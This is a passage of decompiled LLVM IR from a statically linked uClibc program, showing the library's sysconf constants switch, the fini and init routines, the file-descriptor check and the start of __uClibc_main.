    i32 88, label %dec_label_pc_8054949
    i32 89, label %dec_label_pc_8054953
    i32 90, label %dec_label_pc_80549ca
    i32 91, label %dec_label_pc_80548d9
    i32 92, label %dec_label_pc_80548d9
    i32 93, label %dec_label_pc_80548d9
    i32 94, label %dec_label_pc_80548d9
    i32 95, label %dec_label_pc_80549ae
    i32 96, label %dec_label_pc_80549d8
    i32 97, label %dec_label_pc_80549d8
    i32 98, label %dec_label_pc_80548d9
    i32 99, label %dec_label_pc_80548d9
    i32 100, label %dec_label_pc_80548d9
    i32 101, label %dec_label_pc_805495d
    i32 102, label %dec_label_pc_80549a0
    i32 103, label %dec_label_pc_80549dd
    i32 104, label %dec_label_pc_80549b5
    i32 105, label %dec_label_pc_8054967
    i32 106, label %dec_label_pc_80549c3
    i32 107, label %dec_label_pc_80549c3
    i32 108, label %dec_label_pc_80549a7
    i32 109, label %dec_label_pc_80549e4
    i32 110, label %dec_label_pc_8054a00
    i32 111, label %dec_label_pc_80549a0
    i32 112, label %dec_label_pc_80549dd
    i32 113, label %dec_label_pc_8054a00
    i32 114, label %dec_label_pc_8054971
    i32 115, label %dec_label_pc_80549f9
    i32 116, label %dec_label_pc_80549d8
    i32 117, label %dec_label_pc_80549d8
    i32 118, label %dec_label_pc_805497b
    i32 119, label %dec_label_pc_8054985
    i32 120, label %dec_label_pc_80549f2
    i32 121, label %dec_label_pc_80549b5
    i32 122, label %dec_label_pc_80549b5
    i32 123, label %dec_label_pc_80549b5
    i32 124, label %dec_label_pc_80549b5
    i32 125, label %dec_label_pc_80548d9
    i32 126, label %dec_label_pc_80548d9
    i32 127, label %dec_label_pc_80549d8
    i32 128, label %dec_label_pc_80549d8
    i32 129, label %dec_label_pc_80548d9
    i32 130, label %dec_label_pc_80548d9
    i32 131, label %dec_label_pc_80549d8
    i32 149, label %dec_label_pc_805498c
  ]

dec_label_pc_80548d9:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054a05

dec_label_pc_80548e3:                             ; preds = %entry
  %v1_80548e3 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_80548e8 = inttoptr i32 %v1_80548e3 to i32*
  store i32 22, i32* %v1_80548e8, align 4
  br label %dec_label_pc_80549d8

dec_label_pc_80548f3:                             ; preds = %entry
  br label %dec_label_pc_8054a05

dec_label_pc_80548fd:                             ; preds = %entry
  br label %dec_label_pc_8054a05

dec_label_pc_8054907:                             ; preds = %entry
  br label %dec_label_pc_8054a05

dec_label_pc_8054911:                             ; preds = %entry
  %v1_8054914 = call i32 @getdtablesize(i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8054919

dec_label_pc_8054919:                             ; preds = %entry, %dec_label_pc_8054911
  br label %dec_label_pc_8054a05

dec_label_pc_8054923:                             ; preds = %entry
  %v0_8054926 = call i32 @__GI_getpagesize()
  br label %dec_label_pc_805492b

dec_label_pc_805492b:                             ; preds = %entry, %dec_label_pc_8054923
  br label %dec_label_pc_8054a05

dec_label_pc_8054935:                             ; preds = %entry
  br label %dec_label_pc_8054a05

dec_label_pc_805493f:                             ; preds = %entry
  br label %dec_label_pc_8054a05

dec_label_pc_8054949:                             ; preds = %entry
  br label %dec_label_pc_8054a05

dec_label_pc_8054953:                             ; preds = %entry
  br label %dec_label_pc_8054a05

dec_label_pc_805495d:                             ; preds = %entry
  br label %dec_label_pc_8054a05

dec_label_pc_8054967:                             ; preds = %entry
  br label %dec_label_pc_8054a05

dec_label_pc_8054971:                             ; preds = %entry
  br label %dec_label_pc_8054a05

dec_label_pc_805497b:                             ; preds = %entry
  br label %dec_label_pc_8054a05

dec_label_pc_8054985:                             ; preds = %entry
  br label %dec_label_pc_8054a05

dec_label_pc_805498c:                             ; preds = %entry
  %v5_8054992 = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_805499a = icmp slt i32 %v5_8054992, 0
  %v1_805499c = icmp eq i1 %v2_805499a, false
  br i1 %v1_805499c, label %dec_label_pc_80549ae, label %dec_label_pc_80549d8

dec_label_pc_80549a0:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054a05

dec_label_pc_80549a7:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054a05

dec_label_pc_80549ae:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_805498c
  br label %dec_label_pc_8054a05

dec_label_pc_80549b5:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054a05

dec_label_pc_80549bc:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054a05

dec_label_pc_80549c3:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054a05

dec_label_pc_80549ca:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054a05

dec_label_pc_80549d1:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054a05

dec_label_pc_80549d8:                             ; preds = %dec_label_pc_805498c, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_80548e3
  br label %dec_label_pc_8054a05

dec_label_pc_80549dd:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054a05

dec_label_pc_80549e4:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054a05

dec_label_pc_80549eb:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054a05

dec_label_pc_80549f2:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054a05

dec_label_pc_80549f9:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054a05

dec_label_pc_8054a00:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8054a05

dec_label_pc_8054a05:                             ; preds = %dec_label_pc_80549f9, %dec_label_pc_80549f2, %dec_label_pc_80549eb, %dec_label_pc_80549e4, %dec_label_pc_80549dd, %dec_label_pc_80549d1, %dec_label_pc_80549ca, %dec_label_pc_80549c3, %dec_label_pc_80549bc, %dec_label_pc_80549b5, %dec_label_pc_80549a7, %dec_label_pc_80549a0, %dec_label_pc_80549ae, %dec_label_pc_8054985, %dec_label_pc_805497b, %dec_label_pc_8054971, %dec_label_pc_8054967, %dec_label_pc_805495d, %dec_label_pc_8054953, %dec_label_pc_8054949, %dec_label_pc_805493f, %dec_label_pc_8054935, %dec_label_pc_805492b, %dec_label_pc_8054919, %dec_label_pc_8054907, %dec_label_pc_80548fd, %dec_label_pc_80548f3, %dec_label_pc_80548d9, %dec_label_pc_80549d8, %dec_label_pc_8054a00
  %v0_8054a08 = phi i32 [ 255, %dec_label_pc_80549f9 ], [ 2048, %dec_label_pc_80549f2 ], [ 99, %dec_label_pc_80549eb ], [ 20, %dec_label_pc_80549e4 ], [ -128, %dec_label_pc_80549dd ], [ 1024, %dec_label_pc_80549d1 ], [ 4, %dec_label_pc_80549ca ], [ 32, %dec_label_pc_80549c3 ], [ 256, %dec_label_pc_80549bc ], [ 2147483647, %dec_label_pc_80549b5 ], [ 16, %dec_label_pc_80549a7 ], [ 127, %dec_label_pc_80549a0 ], [ 200112, %dec_label_pc_80549ae ], [ 9, %dec_label_pc_8054985 ], [ 65535, %dec_label_pc_805497b ], [ -32768, %dec_label_pc_8054971 ], [ -2147483648, %dec_label_pc_8054967 ], [ 8, %dec_label_pc_805495d ], [ 500, %dec_label_pc_8054953 ], [ 4096, %dec_label_pc_8054949 ], [ 16384, %dec_label_pc_805493f ], [ 1000, %dec_label_pc_8054935 ], [ 32768, %dec_label_pc_805492b ], [ 6, %dec_label_pc_8054919 ], [ 65536, %dec_label_pc_8054907 ], [ 100, %dec_label_pc_80548fd ], [ 131072, %dec_label_pc_80548f3 ], [ 1, %dec_label_pc_80548d9 ], [ -1, %dec_label_pc_80549d8 ], [ 32767, %dec_label_pc_8054a00 ]
  ret i32 %v0_8054a08

; uselistorder directives
  uselistorder i32 1000, { 2, 0, 1, 3 }
  uselistorder i32 16384, { 0, 10, 5, 6, 7, 8, 9, 1, 2, 3, 4 }
  uselistorder i32 -2147483648, { 4, 6, 0, 5, 7, 1, 2, 3 }
  uselistorder i32 (i32)* @getdtablesize, { 3, 2, 1, 0 }
  uselistorder i32 149, { 2, 1, 3, 0 }
  uselistorder i32 130, { 1, 0 }
  uselistorder i32 129, { 2, 0, 1 }
  uselistorder i32 126, { 1, 0 }
  uselistorder i32 125, { 1, 0 }
  uselistorder i32 124, { 2, 1, 0 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 122, { 1, 0 }
  uselistorder i32 121, { 1, 0 }
  uselistorder i32 119, { 1, 0 }
  uselistorder i32 118, { 1, 0 }
  uselistorder i32 117, { 1, 0 }
  uselistorder i32 115, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 113, { 1, 0 }
  uselistorder i32 111, { 1, 0 }
  uselistorder i32 110, { 2, 0, 1 }
  uselistorder i32 109, { 1, 0 }
  uselistorder i32 108, { 1, 0 }
  uselistorder i32 107, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 105, { 1, 0 }
  uselistorder i32 103, { 1, 0 }
  uselistorder i32 99, { 1, 2, 0 }
  uselistorder i32 98, { 1, 0 }
  uselistorder i32 96, { 1, 0 }
  uselistorder i32 95, { 4, 2, 1, 3, 0 }
  uselistorder i32 94, { 1, 0 }
  uselistorder i32 93, { 1, 0 }
  uselistorder i32 92, { 1, 0 }
  uselistorder i32 91, { 1, 0 }
  uselistorder i32 90, { 1, 0 }
  uselistorder i32 89, { 1, 0 }
  uselistorder i32 87, { 1, 2, 0 }
  uselistorder i32 86, { 1, 0 }
  uselistorder i32 85, { 1, 0 }
  uselistorder i32 83, { 1, 0 }
  uselistorder i32 82, { 1, 0 }
  uselistorder i32 81, { 1, 0 }
  uselistorder i32 79, { 1, 0 }
  uselistorder i32 78, { 1, 0 }
  uselistorder i32 77, { 1, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 74, { 1, 0 }
  uselistorder i32 73, { 1, 0 }
  uselistorder i32 71, { 1, 0 }
  uselistorder i32 70, { 2, 3, 1, 0 }
  uselistorder i32 66, { 1, 0 }
  uselistorder i32 65, { 1, 0, 2, 3 }
  uselistorder i32 63, { 1, 2, 0 }
  uselistorder i32 62, { 1, 0 }
  uselistorder i32 61, { 1, 0 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 57, { 1, 0 }
  uselistorder i32 55, { 1, 2, 0 }
  uselistorder i32 54, { 1, 0 }
  uselistorder i32 53, { 2, 1, 0 }
  uselistorder i32 50, { 3, 0, 1, 2 }
  uselistorder i32 49, { 1, 0 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 38, { 2, 3, 1, 0 }
  uselistorder i32 30, { 8, 3, 2, 4, 5, 0, 1, 6, 7 }
  uselistorder i32 29, { 1, 0 }
  uselistorder i32 26, { 3, 2, 1, 0 }
  uselistorder i32 25, { 1, 0 }
  uselistorder i32 23, { 2, 3, 1, 0 }
  uselistorder i32 19, { 3, 2, 0, 1 }
  uselistorder i32 18, { 1, 0 }
  uselistorder i32 13, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8054a05, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_80549d8, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_80549ae, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_805492b, { 1, 0 }
  uselistorder label %dec_label_pc_8054919, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054a0c = load i32, i32* @ebx, align 4
  store i32 %v0_8054a0c, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805f3c8.994 to i32), i32 -134607816), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805f3c8.994 to i32), i32 -134607816), i32 2), i32 0), label %dec_label_pc_8054a20, label %dec_label_pc_8054a2d

dec_label_pc_8054a20:                             ; preds = %entry, %dec_label_pc_8054a20
  %v1_8054a276 = phi i32 [ %v1_8054a27, %dec_label_pc_8054a20 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805f3c8.994 to i32), i32 -134607816), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_8054a27.995 to i32), i32* %stack_var_-16, align 4
  %v5_8054a20 = mul i32 %v1_8054a276, 4
  %v6_8054a20 = add i32 %v5_8054a20, ptrtoint (i32* @global_var_805f3c8.994 to i32)
  %v7_8054a20 = inttoptr i32 %v6_8054a20 to i32*
  %v8_8054a20 = load i32, i32* %v7_8054a20, align 4
  call void @__pseudo_call(i32 %v8_8054a20)
  %v0_8054a27.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054a27 = add i32 %v0_8054a27.pre, -1
  store i32 %v1_8054a27, i32* %ebx.global-to-local, align 4
  %v10_8054a28 = icmp eq i32 %v0_8054a27.pre, 0
  %v1_8054a2b = icmp eq i1 %v10_8054a28, false
  br i1 %v1_8054a2b, label %dec_label_pc_8054a20, label %dec_label_pc_8054a2d

dec_label_pc_8054a2d:                             ; preds = %dec_label_pc_8054a20, %entry
  %v0_8054a2d = load i32, i32* @global_var_8065b14.996, align 4
  %v1_8054a32 = icmp eq i32 %v0_8054a2d, 0
  br i1 %v1_8054a32, label %dec_label_pc_8054a38, label %dec_label_pc_8054a36

dec_label_pc_8054a36:                             ; preds = %dec_label_pc_8054a2d
  %v0_8054a36 = load i32, i32* %stack_var_-16, align 4
  %v1_8054a36 = call i32 @unknown_0(i32 %v0_8054a36)
  br label %dec_label_pc_8054a38

dec_label_pc_8054a38:                             ; preds = %dec_label_pc_8054a36, %dec_label_pc_8054a2d
  %v0_8054a38 = load i32, i32* @global_var_8065b18.997, align 8
  %v1_8054a3e = icmp eq i32 %v0_8054a38, 0
  br i1 %v1_8054a3e, label %dec_label_pc_8054a47, label %dec_label_pc_8054a42

dec_label_pc_8054a42:                             ; preds = %dec_label_pc_8054a38
  %v2_8054a44 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054a44, i32* %ebx.global-to-local, align 4
  %v0_8054a45 = load i32, i32* %stack_var_-16, align 4
  %v1_8054a45 = call i32 @unknown_0(i32 %v0_8054a45)
  br label %dec_label_pc_8054a47

dec_label_pc_8054a47:                             ; preds = %dec_label_pc_8054a38, %dec_label_pc_8054a42
  %v2_8054a47 = load i32, i32* %stack_var_-16, align 4
  %v2_8054a48 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054a48, i32* @edx, align 4
  ret i32 %v2_8054a47

; uselistorder directives
  uselistorder i32 %v1_8054a27, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 1, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8054a47, { 1, 0 }
  uselistorder label %dec_label_pc_8054a20, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8054a4e = load i32, i32* @eax, align 4
  ret i32 %v0_8054a4e
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8054a4f = load i32, i32* @esi, align 4
  %v0_8054a50 = load i32, i32* @ebx, align 4
  store i32 %v0_8054a50, i32* %stack_var_-8, align 4
  %v0_8054a54 = load i32, i32* @eax, align 4
  store i32 %v0_8054a54, i32* @esi, align 4
  %v0_8054a56 = load i32, i32* @edx, align 4
  store i32 %v0_8054a56, i32* @ebx, align 4
  %v4_8054a5b = call i32 @__libc_fcntl(i32 %v0_8054a54, i32 1, i32 %tmp6)
  %v8_8054a63 = icmp eq i32 %v4_8054a5b, -1
  %v1_8054a64 = icmp eq i1 %v8_8054a63, false
  br i1 %v1_8054a64, label %dec_label_pc_8054a7f, label %dec_label_pc_8054a66

dec_label_pc_8054a66:                             ; preds = %entry
  %v0_8054a68 = load i32, i32* @ebx, align 4
  %v5_8054a6e = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805df4c.998, i32 0, i32 0), i32 %v0_8054a68)
  %v1_8054a76 = load i32, i32* @esi, align 4
  %v12_8054a76 = icmp eq i32 %v5_8054a6e, %v1_8054a76
  br i1 %v12_8054a76, label %dec_label_pc_8054a7f, label %dec_label_pc_8054a7a

dec_label_pc_8054a7a:                             ; preds = %dec_label_pc_8054a66
  %v0_8054a7a = call i32 @abort()
  br label %dec_label_pc_8054a7f

dec_label_pc_8054a7f:                             ; preds = %entry, %dec_label_pc_8054a66, %dec_label_pc_8054a7a
  %v2_8054a7f = load i32, i32* %stack_var_-12, align 4
  %v2_8054a80 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054a80, i32* @ebx, align 4
  store i32 %v0_8054a4f, i32* @esi, align 4
  ret i32 %v2_8054a7f

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8054a7f, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_8054a86 = load i8, i8* @global_var_8065b1c.999, align 4
  %v1_8054a86 = icmp eq i8 %v0_8054a86, 0
  %v1_8054a8d = icmp eq i1 %v1_8054a86, false
  br i1 %v1_8054a8d, label %entry.dec_label_pc_8054abf_crit_edge, label %dec_label_pc_8054a8f

entry.dec_label_pc_8054abf_crit_edge:             ; preds = %entry
  %v0_8054ac2.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8054abf

dec_label_pc_8054a8f:                             ; preds = %entry
  store i8 1, i8* @global_var_8065b1c.999, align 4
  store i32 4096, i32* @global_var_8065b10.1000, align 16
  %v0_8054aba = call i32 @_stdio_init()
  br label %dec_label_pc_8054abf

dec_label_pc_8054abf:                             ; preds = %entry.dec_label_pc_8054abf_crit_edge, %dec_label_pc_8054a8f
  %v0_8054ac2 = phi i32 [ %v0_8054ac2.pre, %entry.dec_label_pc_8054abf_crit_edge ], [ %v0_8054aba, %dec_label_pc_8054a8f ]
  ret i32 %v0_8054ac2

; uselistorder directives
  uselistorder i8* @global_var_8065b1c.999, { 1, 0 }
  uselistorder label %dec_label_pc_8054abf, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %v0_8054ac3 = load i32, i32* @ebp, align 4
  store i32 %tmp31, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_8065b08.1001, align 8
  store i32 %arg6, i32* @global_var_8065b18.997, align 8
  %v2_8054afa = mul i32 %arg2, 4
  %v3_8054afa = add i32 %tmp31, %v2_8054afa
  %v1_8054afd = add i32 %v3_8054afa, 4
  store i32 %v1_8054afd, i32* @global_var_8065b0c.992, align 4
  %v3_8054b05 = load i32, i32* %arg3, align 4
  %v14_8054b05 = icmp eq i32 %v1_8054afd, %v3_8054b05
  %v1_8054b07 = icmp eq i1 %v14_8054b05, false
  br i1 %v1_8054b07, label %dec_label_pc_8054b0f, label %dec_label_pc_8054b09

dec_label_pc_8054b09:                             ; preds = %entry
  store i32 %v3_8054afa, i32* @global_var_8065b0c.992, align 4
  br label %dec_label_pc_8054b0f

dec_label_pc_8054b0f:                             ; preds = %entry, %dec_label_pc_8054b09
  store i32 120, i32* %stack_var_-164, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8054b14 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8054b19 = bitcast i32* %stack_var_-136 to i8*
  %v4_8054b19 = call i32 @__GI_memset(i8* %v3_8054b19, i32 0, i32 120)
  %v0_8054b1e = load i32, i32* @global_var_8065b0c.992, align 4
  br label %dec_label_pc_8054b26

dec_label_pc_8054b26:                             ; preds = %dec_label_pc_8054b26, %dec_label_pc_8054b0f
  %v0_8054b26 = phi i32 [ %v1_8054b29, %dec_label_pc_8054b26 ], [ %v0_8054b1e, %dec_label_pc_8054b0f ]
  %v1_8054b26 = inttoptr i32 %v0_8054b26 to i32*
  %v2_8054b26 = load i32, i32* %v1_8054b26, align 4
  %v3_8054b26 = icmp eq i32 %v2_8054b26, 0
  %v1_8054b29 = add i32 %v0_8054b26, 4
  %v1_8054b2c = icmp eq i1 %v3_8054b26, false
  br i1 %v1_8054b2c, label %dec_label_pc_8054b26, label %dec_label_pc_8054b4d.preheader

dec_label_pc_8054b4d.preheader:                   ; preds = %dec_label_pc_8054b26
  store i32 %v1_8054b29, i32* @ebx, align 4
  %v1_8054b4d1 = inttoptr i32 %v1_8054b29 to i32*
  %v2_8054b4d2 = load i32, i32* %v1_8054b4d1, align 4
  %v3_8054b4d3 = icmp eq i32 %v2_8054b4d2, 0
  %v1_8054b5010 = icmp eq i1 %v3_8054b4d3, false
  br i1 %v1_8054b5010, label %dec_label_pc_8054b32.lr.ph, label %dec_label_pc_8054b52

dec_label_pc_8054b32.lr.ph:                       ; preds = %dec_label_pc_8054b4d.preheader
  %v3_8054b12 = ptrtoint i32* %stack_var_-168 to i32
  %v3_8054b3d = add i32 %v3_8054b12, 32
  br label %dec_label_pc_8054b32

dec_label_pc_8054b32:                             ; preds = %dec_label_pc_8054b32.lr.ph, %dec_label_pc_8054b4a
  %v1_8054b3d = phi i32 [ %v2_8054b4d2, %dec_label_pc_8054b32.lr.ph ], [ %v2_8054b4d, %dec_label_pc_8054b4a ]
  %v0_8054b3c = phi i32 [ %v1_8054b29, %dec_label_pc_8054b32.lr.ph ], [ %v1_8054b4a, %dec_label_pc_8054b4a ]
  %v6_8054b37 = icmp ugt i32 %v1_8054b3d, 14
  br i1 %v6_8054b37, label %dec_label_pc_8054b4a, label %dec_label_pc_8054b39

dec_label_pc_8054b39:                             ; preds = %dec_label_pc_8054b32
  store i32 8, i32* %stack_var_-164, align 4
  store i32 %v0_8054b3c, i32* %stack_var_-168, align 4
  %v2_8054b3d = mul i32 %v1_8054b3d, 8
  %v4_8054b3d = add i32 %v3_8054b3d, %v2_8054b3d
  %v3_8054b42 = inttoptr i32 %v4_8054b3d to i16*
  %v4_8054b42 = call i32 @memcpy(i16* %v3_8054b42, i32 %v0_8054b3c, i32 8)
  %v0_8054b4a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054b4a

dec_label_pc_8054b4a:                             ; preds = %dec_label_pc_8054b32, %dec_label_pc_8054b39
  %v0_8054b4a = phi i32 [ %v0_8054b3c, %dec_label_pc_8054b32 ], [ %v0_8054b4a.pre, %dec_label_pc_8054b39 ]
  %v1_8054b4a = add i32 %v0_8054b4a, 8
  store i32 %v1_8054b4a, i32* @ebx, align 4
  %v1_8054b4d = inttoptr i32 %v1_8054b4a to i32*
  %v2_8054b4d = load i32, i32* %v1_8054b4d, align 4
  %v3_8054b4d = icmp eq i32 %v2_8054b4d, 0
  %v1_8054b50 = icmp eq i1 %v3_8054b4d, false
  br i1 %v1_8054b50, label %dec_label_pc_8054b32, label %dec_label_pc_8054b52

dec_label_pc_8054b52:                             ; preds = %dec_label_pc_8054b4a, %dec_label_pc_8054b4d.preheader
  store i32 %v2_8054b14, i32* @eax, align 4
  %v0_8054b56 = call i32 @_dl_aux_init()
  store i32 %v0_8054b56, i32* @eax, align 4
  %v0_8054b5b = call i32 @__GI___uClibc_init()
  %v1_8054b64 = icmp eq i32 %tmp26, 0
  %v1_8054b66 = icmp eq i1 %v1_8054b64, false
  br i1 %v1_8054b66, label %dec_label_pc_8054b6c, label %dec_label_pc_8054b68

dec_label_pc_8054b68:                             ; preds = %dec_label_pc_8054b52
  %v1_8054b68 = and i32 %tmp26, -65536
  %v2_8054b68 = or i32 %v1_8054b68, 4096
  br label %dec_label_pc_8054b6c

dec_label_pc_8054b6c:                             ; preds = %dec_label_pc_8054b52, %dec_label_pc_8054b68
  %v0_8054b6c = phi i32 [ %tmp26, %dec_label_pc_8054b52 ], [ %v2_8054b68, %dec_label_pc_8054b68 ]
  store i32 %v0_8054b6c, i32* @global_var_8065b10.1000, align 16
  %v13_8054b71 = icmp eq i32 %tmp25, -1
  %v1_8054b76 = icmp eq i1 %v13_8054b71, false
  br i1 %v1_8054b76, label %dec_label_pc_8054ba1, label %dec_label_pc_8054b78

dec_label_pc_8054b78:                             ; preds = %dec_label_pc_8054b6c
  %v0_8054b78 = call i32 @getuid()
  store i32 %v0_8054b78, i32* @ebx, align 4
  %v0_8054b7f = call i32 @geteuid()
  %v0_8054b84 = load i32, i32* @ebx, align 4
  %v12_8054b84 = icmp eq i32 %v0_8054b84, %v0_8054b7f
  %v1_8054b86 = icmp eq i1 %v12_8054b84, false
  br i1 %v1_8054b86, label %dec_label_pc_8054bb7, label %dec_label_pc_8054b88

dec_label_pc_8054b88:                             ; preds = %dec_label_pc_8054b78
  %v0_8054b88 = call i32 @getgid()
  store i32 %v0_8054b88, i32* @ebx, align 4
  %v0_8054b8f = call i32 @getegid()
  %v0_8054b94 = load i32, i32* @ebx, align 4
  %v12_8054b94 = icmp eq i32 %v0_8054b94, %v0_8054b8f
  %v1_8054b96 = icmp eq i1 %v12_8054b94, false
  br i1 %v1_8054b96, label %dec_label_pc_8054bb7, label %dec_label_pc_8054b98.thread

dec_label_pc_8054b98.thread:                      ; preds = %dec_label_pc_8054b88
  br label %dec_label_pc_8054be1

dec_label_pc_8054ba1:                             ; preds = %dec_label_pc_8054b6c
  %v15_8054ba1 = icmp eq i32 %tmp25, %tmp24
  %v1_8054ba5 = icmp eq i1 %v15_8054ba1, false
  br i1 %v1_8054ba5, label %dec_label_pc_8054bb7, label %dec_label_pc_8054ba7

dec_label_pc_8054ba7:                             ; preds = %dec_label_pc_8054ba1
  br label %dec_label_pc_8054bb7

dec_label_pc_8054bb7:                             ; preds = %dec_label_pc_8054ba7, %dec_label_pc_8054ba1, %dec_label_pc_8054b88, %dec_label_pc_8054b78
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8054bbe = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8054bcd = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8054bdc = call i32 @__check_one_fd()
  br label %dec_label_pc_8054be1

dec_label_pc_8054be1:                             ; preds = %dec_label_pc_8054b98.thread, %dec_label_pc_8054bb7
  store i32 ptrtoint (i32* @global_var_805f3c8.994 to i32), i32* %esi.global-to-local, align 4
  %v0_8054be6 = load i32, i32* @edi, align 4
  %v1_8054be6 = inttoptr i32 %v0_8054be6 to i32*
  %v2_8054be6 = load i32, i32* %v1_8054be6, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_805f3c8.994 to i32), i32 -134607816), i32* %esi.global-to-local, align 4
  store i32 %v2_8054be6, i32* inttoptr (i32 134609016 to i32*), align 8
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_805f3c8.994 to i32), i32 -134607816), i32 4), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_8065b14.996, align 4
  br i1 icmp ugt (i32 add (i32 ptrtoint (i32* @global_var_805f3c8.994 to i32), i32 -134607813), i32 6), label %dec_label_pc_8054c06, label %dec_label_pc_8054c12

dec_label_pc_8054c06:                             ; preds = %dec_label_pc_8054be1, %dec_label_pc_8054c06
  %v4_8054c0648 = phi i32 [ %v1_8054c0d, %dec_label_pc_8054c06 ], [ 0, %dec_label_pc_8054be1 ]
  %v5_8054c06 = mul i32 %v4_8054c0648, 4
  %v6_8054c06 = add i32 %v5_8054c06, ptrtoint (i32* @global_var_805f3c8.994 to i32)
  %v7_8054c06 = inttoptr i32 %v6_8054c06 to i32*
  %v8_8054c06 = load i32, i32* %v7_8054c06, align 4
  call void @__pseudo_call(i32 %v8_8054c06)
  %v0_8054c0d = load i32, i32* %ebx.global-to-local, align 4
